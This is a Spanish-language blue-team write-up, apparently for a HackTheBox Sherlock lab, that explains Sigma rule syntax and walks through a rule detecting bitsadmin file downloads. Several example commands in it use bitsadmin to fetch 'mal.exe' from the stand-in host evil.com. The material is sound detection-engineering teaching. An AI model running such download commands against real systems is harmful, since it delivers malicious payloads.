---
layout: single
title: Sherlock - Learn_Sigma
excerpt: Ejercicio práctico para entender las reglas sigma, su uso y definición
date: 2026-10-2
classes: wide
header:
   teaser: ../assets/images/logoletsdefend.png
   teaser_home_page: true
   icon: ../assets/images/hackthebox.webp
categories:
   - hackthebox
   - soc
   - blue team
   - dfir
tags:
   - sigma
   - yaml
   - yml
   - detection-engineering
   - detection-rules
   - sigma-rules
   - sigmahq
   - sigma-cli
   - pysigma
   - siem
   - log-analysis
   - logsource
   - process_creation
   - detection-logic
   - condition
   - selection
   - modifiers
   - bitsadmin
   - bits-jobs
   - lolbas
   - living-off-the-land
   - mitre-attack
   - t1197
   - t1036
   - defense-evasion
   - persistence
   - sysmon
   - windows-event-log
   - event-id-4688
   - commandline
   - parentcommandline
   - originalfilename
   - pe-metadata
   - masquerading
   - false-positives
   - blue-team
   - soc
   - dfir
   - hackthebox
   - htb-labs
   - learn_sigma
---

**Sherlock Scenario: Your organization has detected a ransomware infection on one of its critical systems, and it is imperative that you address this issue immediately. This type of malware searches for valuable files, such as sensitive documents and configuration files, and encrypts them using a strong encryption algorithm.**

**The investigation has revealed that the ransomware may have used the Windows utility bitsadmin.exe to download additional malicious payloads or communicate with its command-and-control (C2) server.**

**Your task is to carefully review the Sigma rule, answer the related questions, and understand how different rule sections (selection, condition, fields, tags, logsource) work together to detect malicious activity.**

----------

Para este laboratorio se nos da un fichero `.yml` que contiene una regla sigma, así que pasamos rápido a explicar qué es esto junto con las preguntas.

-----------

### Sigma y las reglas en YAML

#### ¿Qué es Sigma?

Sigma es un **formato abierto y genérico para escribir reglas de detección sobre logs**. Es lo que YARA es para archivos y Snort/Suricata para tráfico de red, pero para eventos de log. Su gran ventaja es que la regla es **independiente del SIEM**: se escribe una vez y se **convierte** al lenguaje de cada plataforma (Splunk SPL, Elastic Query DSL/KQL, Microsoft Sentinel KQL, QRadar, etc.) con herramientas como `sigma-cli` y pySigma.

Por eso se comparte mucho en la comunidad (SigmaHQ en GitHub tiene miles de reglas), y por eso conviene saber leerlas.

#### ¿Por qué YAML?

YAML es un formato de serialización basado en **indentación** (como Python), legible por humanos. Para leer Sigma necesitas tres ideas:

- **Mapa (clave: valor):** `level: medium`
- **Lista:** elementos con guion (`- valor`)
- **Anidación:** se define con espacios (nunca tabuladores)

En este caso se nos da la siguiente regla:

```yml
title: File Download Via Bitsadmin
id: d059842b-6b9d-4ed1-b5c3-5b89143c6ede
status: test
description: Detects usage of bitsadmin downloading a file
references:
    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin
    - https://isc.sans.edu/diary/22264
    - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/
author: Michael Haag, FPT.EagleEye
date: 2017-03-09
modified: 2023-02-15
tags:
    - attack.defense-evasion
    - attack.persistence
    - attack.t1197
    - attack.s0190
    - attack.t1036.003
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        - Image|endswith: '\bitsadmin.exe'
        - OriginalFileName: 'bitsadmin.exe'
    selection_cmd:
        CommandLine|contains: ' /transfer '
    selection_cli_1:
        CommandLine|contains:
            - ' /create '
            - ' /addfile '
    selection_cli_2:
        CommandLine|contains: 'http'
    condition: selection_img and (selection_cmd or all of selection_cli_*)
fields:
    - CommandLine
    - ParentCommandLine
falsepositives:
    - Some legitimate apps use this, but limited.
level: medium
```

#### Anatomía de la regla

**1. Metadatos (quién, qué, cuándo)**
- `title`: nombre de la regla
- `id`: UUID único para identificarla
- `status`: madurez de la regla (`experimental`, `test`, `stable`). Aquí es `test`, o sea, aún no está totalmente validada
- `description`: qué detecta
- `references`: fuentes (blog de NetSPI, LOLBAS, etc.)
- `author`, `date`, `modified`: autoría y control de versiones
- `level`: severidad (`informational`, `low`, `medium`, `high`, `critical`)
- `falsepositives`: qué actividad legítima podría disparar la alerta
- `fields`: campos útiles para mostrar al analista (`CommandLine`, `ParentCommandLine`)

**2. Tags (mapeo a MITRE ATT&CK)**
- `attack.t1197` → *BITS Jobs*
- `attack.t1036.003` → *Masquerading: Rename System Utilities*
- `attack.s0190` → el software BITSAdmin
- `attack.defense-evasion` y `attack.persistence` → tácticas

**3. `logsource` (dónde buscar)**
```yaml
logsource:
    category: process_creation
    product: windows
```
Le dice al conversor qué tipo de evento es: creación de procesos en Windows (Sysmon Event ID 1 o Security 4688). Gracias a esto el conversor mapea los campos al esquema de cada plataforma.

**4. `detection` (la lógica, lo más importante)**

Aquí hay dos partes: los **selections** (bloques con condiciones) y la **condition** (cómo se combinan).

```yaml
detection:
    selection_img:
        - Image|endswith: '\bitsadmin.exe'
        - OriginalFileName: 'bitsadmin.exe'
    selection_cmd:
        CommandLine|contains: ' /transfer '
    selection_cli_1:
        CommandLine|contains:
            - ' /create '
            - ' /addfile '
    selection_cli_2:
        CommandLine|contains: 'http'
    condition: selection_img and (selection_cmd or all of selection_cli_*)
```

#### Reglas de lógica
| Estructura | Significado |
|---|---|
| Varios campos en un mismo mapa | **AND** |
| Lista de valores para un campo | **OR** |
| Lista de mapas (`- campo: x`, `- campo: y`) | **OR** entre mapas |

#### Modificadores (el `|`)
- `|endswith` → el valor termina en…
- `|contains` → contiene…
- Otros comunes: `|startswith`, `|re` (regex), `|all` (todos los valores deben aparecer), `|base64`

### Leyendo la condition
`selection_img and (selection_cmd or all of selection_cli_*)` se traduce a:

> El proceso es **bitsadmin** Y (la línea de comandos tiene `/transfer` **O** (tiene `/create` o `/addfile` **Y** además contiene `http`)).

`all of selection_cli_*` es un *wildcard*: significa que deben cumplirse todos los selections cuyo nombre empiece con `selection_cli_`.

## Detalle interesante: `Image` + `OriginalFileName`

Un atacante puede copiar `bitsadmin.exe` y renombrarlo (técnica T1036.003) para evadir reglas que solo miran el nombre del ejecutable. `OriginalFileName` viene de los metadatos PE del binario, que sobreviven al renombrado. Por eso la regla usa ambos campos con OR.

## Ejemplo práctico: conversión

Con `sigma-cli` se le puede pasar la regla al SIEM que usemos:

```bash
pip install sigma-cli
sigma plugin install splunk elasticsearch
sigma convert -t splunk -p splunk_windows regla.yml
sigma convert -t lucene -p ecs_windows regla.yml
```
La misma regla produce una consulta en SPL para Splunk y otra en Lucene/KQL para Elastic.

---

-----------

**1\. Which executable file was specifically targeted by this Sigma rule?**

Esto está en el siguiente campo:

```yml

detection:
    selection_img:
        - Image|endswith: '\bitsadmin.exe'
        - OriginalFileName: 'bitsadmin.exe'
```

El `riginalFileName: 'bitsadmin.exe'` revisa el nombre que viene en los metadatos del PE, por si el atacante intenta renombrarlo.

------------------

**2\. What command-line option is used to indicate a file transfer in this rule?**

En el siguiente campo:

```bash
    selection_cmd:
        CommandLine|contains: ' /transfer '
```

--------------

**3\. What logical expression in the condition field combined the criteria to trigger this rule?**

Aquí nos fijamos en el siguiente bloque:

```yml
    selection_cmd:
        CommandLine|contains: ' /transfer '
    selection_cli_1:
        CommandLine|contains:
            - ' /create '
            - ' /addfile '
    selection_cli_2:
        CommandLine|contains: 'http'
    condition: selection_img and (selection_cmd or all of selection_cli_*)
```

#### Qué hace cada bloque

| Bloque | Qué busca |
|---|---|
| `selection_img` | Que el proceso sea bitsadmin (por nombre o por `OriginalFileName`) |
| `selection_cmd` | Que la línea de comandos contenga ` /transfer ` |
| `selection_cli_1` | Que contenga ` /create ` **o** ` /addfile ` (lista de valores = OR) |
| `selection_cli_2` | Que contenga `http` |

#### Dos caminos de detección

La condición es:

```
selection_img and (selection_cmd or all of selection_cli_*)
```

`all of selection_cli_*` equivale a `selection_cli_1 and selection_cli_2`, así que queda:

```
bitsadmin AND ( /transfer   OR   ((/create OR /addfile) AND http) )
```

**Camino A: `/transfer`.** BITSAdmin permite descargar en un solo comando:
```
bitsadmin /transfer job1 /download /priority high http://evil.com/mal.exe C:\temp\mal.exe
```
Aquí basta ver `/transfer`.

**Camino B: `/create` o `/addfile` + `http`.** La otra forma de descargar es con un job en varios pasos, cada uno en un comando distinto:
```
bitsadmin /create job1
bitsadmin /addfile job1 http://evil.com/mal.exe C:\temp\mal.exe
bitsadmin /resume job1
bitsadmin /complete job1
```
Cada línea es un evento de creación de proceso independiente. La regla evalúa un evento a la vez, así que el que dispara es el `/addfile ... http://...`: tiene la opción y la URL en la misma línea. El `/create job1` solo no dispara, porque no trae `http`.

## Por qué existe `selection_cli_2` (http)

`/create` y `/addfile` por sí solos son demasiado comunes, y `/addfile` también puede copiar archivos locales. Exigir `http` asegura que se trata de una **descarga**. Con `/transfer` no se pide `http`, porque se considera suficientemente característico.

----------

**4\. Which single ATT&CK tactic tag is listed first in this rule?**

Esto está en el siguiente bloque:

```bash
tags:
    - attack.defense-evasion
    - attack.persistence
    - attack.t1197
    - attack.s0190
    - attack.t1036.003
```

Cada tag tiene el prefijo attack. (el namespace de MITRE ATT&CK) y después un identificador.

--------

**5\. Which specific field did this rule capture that shows the command being executed?**

`CommandLine`

Este campo contiene la línea de comandos completa con la que se lanzó el proceso, incluyendo el ejecutable y todos sus argumentos, por ejemplo:

```bash
bitsadmin /transfer job1 /download http://evil.com/mal.exe C:\temp\mal.exe
```

Dos cosas a distinguir:

- En detection: CommandLine se usa para evaluar (con |contains) si aparece /transfer, /create, /addfile o http.
- En fields: es lo que la regla le muestra al analista cuando salta la alerta.

```bash
fields:
    - CommandLine
    - ParentCommandLine
```

`CommandLine` es lo que nos dice qué se ejecutó. `ParentCommandLine` nos dice quién lo lanzó. Si vemos que bitsadmin fue lanzado por winword.exe o por un script de PowerShell, eso cambia mucho la lectura del evento. En DFIR se suele pivotear de uno al otro.

-----------

**6\. What is the primary category of events that this Sigma rule was written to monitor?**

Esto lo vemos en el siguiente campo:

```bash
    logsource:
        category: process_creation
        product: windows
```

`category` es un **tipo abstracto de evento**, no un ID concreto. Sigma define categorías (`process_creation`, `network_connection`, `file_event`, `registry_set`, etc.) y el conversor traduce cada una a la fuente real según el backend:

| Fuente | Evento equivalente |
|---|---|
| Sysmon | Event ID 1 |
| Windows Security | Event ID 4688 (requiere habilitar auditoría de línea de comandos) |
| EDR (Defender, CrowdStrike, etc.) | Su telemetría de procesos |

Por eso la regla no menciona IDs: es portable. Además, `process_creation` es la categoría correcta porque la detección depende de los **argumentos** con que se lanzó el proceso, y esos solo existen en el evento de creación.

-----------------

**8\. What specific command-line argument did this rule look for to identify HTTP-based downloads?**

```yaml
selection_cli_2:
    CommandLine|contains: 'http'
```

Sirve para confirmar que la operación es una **descarga desde una URL**. Esto es lo que hace que `/addfile` sea sospechoso: sin `http`, podría ser una copia local legítima.

> como `contains` busca la subcadena, `http` también coincide con `https://`, así que cubre ambos protocolos. A cambio, también coincidiría con una cadena como `C:\http_logs\`, y es una de las razones por las que el nivel es `medium` y hay una sección de falsos positivos.

-----------

**9\. Which command-line option must be present to create a new transfer using bitsadmin?**

BITS trabaja con **jobs** (trabajos de transferencia), y el flujo normal es:

1. `/create` → crea el job (es el paso obligatorio para iniciar una transferencia por este método)
2. `/addfile` → le agrega qué archivo descargar y dónde guardarlo
3. `/resume` → lo activa
4. `/complete` → finaliza y deja el archivo en su destino

```
bitsadmin /create job1
bitsadmin /addfile job1 http://evil.com/mal.exe C:\temp\mal.exe
bitsadmin /resume job1
bitsadmin /complete job1
```

